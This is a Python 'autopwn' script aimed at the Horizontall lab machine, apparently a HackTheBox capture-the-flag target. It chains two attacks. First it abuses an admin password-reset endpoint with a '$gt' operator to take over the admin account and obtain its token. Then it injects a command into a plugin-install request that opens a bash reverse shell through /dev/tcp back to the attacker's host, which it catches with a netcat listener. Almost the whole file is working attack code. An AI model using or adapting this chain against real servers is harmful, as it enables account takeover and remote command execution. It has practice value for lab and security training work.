#!/usr/bin/python3

import requests, sys, time, signal, argparse, subprocess, json, threading
from colorama import init, Fore

init(autoreset=True)

password_url = "http://api-prod.horizontall.htb/admin/auth/reset-password"
reverse_url = "http://api-prod.horizontall.htb/admin/plugins/install"

# colors
red, lgcyan, green, lgyll, lgmg = Fore.RED, Fore.LIGHTCYAN_EX, Fore.GREEN, Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX
info = lgyll + "[" + lgcyan + "•" + lgyll +"]" + Fore.RESET
info_failure = lgyll + "[" + red + "•" + lgyll +"]" + Fore.RESET
plus = lgmg + "[" + green + "✔" + lgmg + "]" + Fore.RESET

def sendExec():
	r = requests.post(reverse_url, json=post_data, headers=headers)

def reverseShell(reverse):
	global headers, post_data
	headers = {"Authorization" : "Bearer " + jwt}
	print(info + " Executing " + red + "Reverse Shell")
	time.sleep(2)
	post_data = {
			"plugin": f"documentation && $({reverse})",
			"port": "1337"
		}
	print(info + " Spawning Netcat Listener")
	threading.Thread(target=sendExec).start()
	subprocess.run(["nc", f"-lvnp {args.lport}"])

def changePassword():
	global jwt
	print(info + " Changing password")
	time.sleep(2)
	post_data = {
		"code": {"$gt": 0},
		"password": password,
		"passwordConfirmation": password
		}

	r = requests.post(password_url, json=post_data)
	response = json.loads(r.text)
	jwt = response['jwt']
	user = response['user']['username']
	mail = response['user']['email']
	print(plus + f" Username: {lgcyan + user}")
	print(plus + f" Email: {lgcyan + mail}")
	print(plus + f" Password: {lgcyan + password}")
	time.sleep(1)

def def_handler(sig, frame):
	print("\n\n" + info_failure + " Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("--lhost", help="The listen address", required=True)
	parser.add_argument("--lport", help="The listen port", required=True)
	parser.add_argument("-p", help="Password for password change", required=True)
	args = parser.parse_args()
	password = args.p

	print( lgmg + """

    __  __           _                   __        ____
   / / / /___  _____(_)___  ____  ____  / /_____ _/ / /
  / /_/ / __ \/ ___/ /_  / / __ \/ __ \/ __/ __ `/ / / 
 / __  / /_/ / /  / / / /_/ /_/ / / / / /_/ /_/ / / /  
/_/ /_/\____/_/  /_/ /___/\____/_/ /_/\__/\__,_/_/_/   
                                                       

	""")

	reverse = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"
	print(info + " Starting script autopwn")
	time.sleep(2)
	print(plus + f" Payload: {lgcyan + reverse}")

	changePassword()
	reverseShell(reverse)